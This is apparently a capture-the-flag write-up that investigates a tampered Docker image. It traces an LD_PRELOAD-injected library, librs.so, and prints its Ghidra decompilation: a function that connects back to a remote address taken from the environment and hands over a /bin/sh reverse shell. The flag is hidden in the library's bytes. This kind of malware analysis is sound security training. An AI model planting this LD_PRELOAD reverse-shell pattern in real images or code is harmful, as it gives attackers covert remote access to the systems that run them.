# peel back the layers

> An unknown maintainer managed to push an update to one of our public docker images. Our SOC team reported suspicious traffic coming from some of our steam factories ever since. The update got retracted making us unable to investigate further. We are concerned that this might refer to a supply-chain attack. Could you investigate?
Docker Image: steammaintainer/gearrepairimage 

Pull and save the docker image:

```
docker pull steammaintainer/gearrepairimage 
docker save -o gearrepairimage.tar steammaintainer/gearrepairimage 
```

extracting the tar archive then investigating (using jq)

```
jq < 47f41629f1cfcaf8890339a7ffdf6414c0c1417cfa75481831c8710196627d5d.json 

```

```json
    {
      "created": "2021-11-12T21:40:23.425193373Z",
      "created_by": "/bin/sh -c #(nop) COPY file:0b1afae23b8f468ed1b0570b72d4855f0a24f2a63388c5c077938dbfdeda945c in /usr/share/lib/librs.so "
    },
    {
      "created": "2021-11-12T21:40:23.607982534Z",
      "created_by": "/bin/sh -c #(nop)  ENV LD_PRELOAD=/usr/share/lib/librs.so",
      "empty_layer": true
    },

```

`find . |rg json|parallel "jq < {}" > jq.all.txt`

suss layer:
86395ded17f0743232e41949150bbd0cdafef25accf0fef2dbe9469f338a6a28/

```
/usr/share/lib:
-rwxr-xr-x 1 h4sh h4sh 17K Nov 13 07:38 librs.so
-rwxr-xr-x 1 h4sh h4sh   0 Jan  1  1970 .wh..wh..opq
```


### reversing librs.so

(update: running `strings` on it also works for getting flag)

in ghidra:

con function (at 101195)


```c
/* DISPLAY WARNING: Type casts are NOT being printed */
undefined8 con(void)

{
  int iVar1;
  char *__nptr;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined local_40;
  undefined local_38 [4];
  in_addr_t local_34;
  int local_20;
  uint16_t local_1a;
  char *local_18;
  __pid_t local_c;
  
  local_c = fork();
  if (local_c == 0) {
    local_18 = getenv("REMOTE_ADDR");
    __nptr = getenv("REMOTE_PORT");
    iVar1 = atoi(__nptr);
    local_1a = iVar1;
    local_68 = 0x33725f317b425448;
    local_60 = 0x6b316c5f796c6c34;
    local_58 = 0x706d343374735f33;
    local_50 = 0x306230725f6b6e75;
    local_48 = 0xd0a7d2121217374;
    local_40 = 0;
    local_38._0_2_ = 2;
    local_34 = inet_addr(local_18);
    local_38._2_2_ = htons(local_1a);
    local_20 = socket(2,1,0);
    connect(local_20,local_38,0x10);
    write(local_20,&local_68,0x29);
    dup2(local_20,0);
    dup2(local_20,1);
    dup2(local_20,2);
    execve("/bin/sh",0x0,0x0);
  }
  return 0;
}
```


flag in the raw data:
```
      001011d7 48 b8 48      MOV       RAX,"3r_1{BTH"
               54 42 7b 
               31 5f 72
      001011e1 48 ba 34      MOV       RDX,"k1l_yll4"
               6c 6c 79 
               5f 6c 31
      001011eb 48 89 45      MOV       qword ptr [RBP + local_68],RAX
               a0
      001011ef 48 89 55      MOV       qword ptr [RBP + local_60],RDX
               a8
      001011f3 48 b8 33      MOV       RAX,"pm43ts_3"
               5f 73 74 
               33 34 6d
      001011fd 48 ba 75      MOV       RDX,"0b0r_knu"
               6e 6b 5f 
               72 30 62
```

```
(little endian)
3r_1{BTH
k1l_yll4
pm43ts_3
0b0r_knu
}!!!st
```


HTB{1_r34lly_l1k3_st34mpunk_r0b0ts!!!}
